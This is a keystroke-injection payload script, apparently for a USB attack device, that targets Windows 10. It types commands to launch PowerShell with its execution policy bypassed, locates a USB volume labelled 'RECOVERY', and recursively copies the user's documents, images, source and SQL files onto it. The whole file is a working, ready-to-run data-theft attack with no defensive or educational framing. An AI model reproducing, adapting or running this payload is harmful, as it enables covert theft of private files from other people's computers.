// =============================================================================
// Title: Exfiltrate Files to SD card (Deep)
// Author: @beigeworm | https://github.com/beigeworm
// Description: Searches target for matching filetypes and copies all files to th SD card.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// exfil lootchest [REQUIRERD]

// =============================================================================
// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("ENTER");
delay(5000);

function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(4000);
}
assurePS32(); // open a 32bit console, if the current one is 64bit
delay(4000);

 type("cd $env:USERPROFILE\n") 

  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'RECOVERY' } | select name\n"); //change YOUR_VOLUME_NAME to the name of your mounted usb volume.
var filetypes = ["jpg", "png", "txt", "html", "gif", "js", "sql", "docx", "php"] // array of filetypes, add filetypes to your liking.
for (var i = 0; i < filetypes.length; i++) {
    type("copy *." + filetypes[i] + " $usbpath.name\n")                                 //copies files with your filetypes to your mounted usb volume.
    type("copy */*." + filetypes[i] + " $usbpath.name\n")                               //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*." + filetypes[i] + " $usbpath.name\n")                             //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*." + filetypes[i] + " $usbpath.name\n")                           //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*." + filetypes[i] + " $usbpath.name\n")                         //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")                       //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")                     //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")                   //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")                 //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")               //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")             //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")           //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")         //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")       //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")     //copies files with your filetypes to your mounted usb volume.
    type("copy */*/*/*/*/*/*/*/*/*/*/*/*/*/*/*." + filetypes[i] + " $usbpath.name\n")   //copies files with your filetypes to your mounted usb volume.
}
